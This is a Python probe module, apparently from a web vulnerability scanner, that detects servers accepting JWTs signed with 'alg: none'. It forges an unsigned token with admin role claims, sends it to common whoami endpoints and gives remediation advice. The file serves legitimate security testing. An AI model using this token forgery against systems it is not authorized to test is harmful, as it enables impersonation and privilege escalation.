#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: server accepts JWTs with `alg: none`.

The `none` algorithm in the JWT spec was supposed to be a debugging
escape hatch and is now considered always-vulnerable when accepted by
production code: an attacker constructs a JWT header `{"alg":"none"}`
plus an arbitrary payload (`{"role":"admin","sub":"victim"}`), appends
an empty signature, and the server treats it as authentic.

This probe synthesises a forged token with a recognisable email claim,
sends it to a "tell me about myself" endpoint, and checks whether the
server's response echoes the forged identity. The forged email is
distinctive (`alg-none-probe-XXXXXXXX@dast.test`) so a positive hit is
unambiguous: nothing else in the world would echo that exact string.

This is the first half of a two-part validation. If the server simply
echoes the email back without independently identifying the user from
its database, the bug exists. (Some implementations IGNORE the email
claim and look up the user by ID; in that case the email won't be
echoed and the verdict is correctly inconclusive — even though the
underlying acceptance of `alg:none` is still a bug we'd have flagged.)

Tested against:
  + OWASP Juice Shop  (recent build patched alg=none — whoami returns
                       {"user":{}}; probe correctly returns
                       validated=False)
  + nginx default site → validated=False
  + (would fire on any app accepting unsigned JWTs that echoes claims)
"""
from __future__ import annotations

import base64
import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# "Tell me about myself" endpoints. Any of these, when given an
# Authorization: Bearer <forged-jwt>, should refuse the forged token.
WHOAMI_PATHS = (
    "/rest/user/whoami",
    "/api/me",
    "/api/users/me",
    "/me",
    "/api/v1/me",
    "/profile",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _build_alg_none_token(email: str) -> str:
    """Construct a JWT with `alg: none` and the supplied email in the
    payload's `data.email` slot (matches Juice Shop's claim shape; most
    other apps put it at root as `email` — we include both for breadth)."""
    header  = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({
        "email": email,
        "data": {"email": email, "role": "admin"},
        "role": "admin",
        "iat": 0,
    }).encode())
    return f"{header}.{payload}."     # trailing dot = empty signature


class JwtAlgNoneProbe(Probe):
    name = "auth_jwt_alg_none"
    summary = ("Detects JWT validation that accepts `alg: none` "
               "tokens — server treats forged unsigned JWTs as authentic.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--whoami-path", action="append", default=[],
            help="Additional 'identify-self' URL path to probe.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(WHOAMI_PATHS) + list(args.whoami_path or [])

        # Synthesise a unique forged email so a hit is unambiguous.
        marker = f"alg-none-{secrets.token_hex(6)}@dast.test"
        token = _build_alg_none_token(marker)

        attempts: list[dict] = []
        confirmed: list[dict] = []
        for p in paths:
            url = urljoin(origin, p)
            r = client.request("GET", url, headers={
                "Authorization": f"Bearer {token}",
            })
            row: dict = {"path": p, "status": r.status, "size": r.size}
            if r.status == 200 and r.body and marker in r.text:
                row.update({"alg_none_accepted": True,
                            "marker_echoed": marker})
                confirmed.append(row)
            attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "marker": marker,
                    "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: server at {origin}{top['path']} "
                         f"accepts JWTs signed with alg=none. The forged "
                         f"email {marker!r} appeared in the response — "
                         "the server treated an unsigned token as "
                         "authentic and echoed our forged identity."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Configure the JWT verification library to refuse "
                    "`alg: none` outright — most libraries support an "
                    "`algorithms` allowlist parameter; pass only the "
                    "algorithm you actually use (e.g. `RS256`).\n"
                    "  - jsonwebtoken (Node): "
                    "  jwt.verify(token, key, { algorithms: ['RS256'] });\n"
                    "  - PyJWT: jwt.decode(token, key, algorithms=['RS256'])\n"
                    "Pair with rotation of the signing key — any token "
                    "issued during the exposure window may have been "
                    "forged. Add a regression test that fires an "
                    "alg=none token at the same endpoint and asserts "
                    "401."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} 'identify-self' "
                     f"endpoints on {origin} with a forged alg=none "
                     "token; none echoed the forged marker, so the "
                     "server is correctly rejecting unsigned JWTs."),
            evidence=evidence,
        )


if __name__ == "__main__":
    JwtAlgNoneProbe().main()
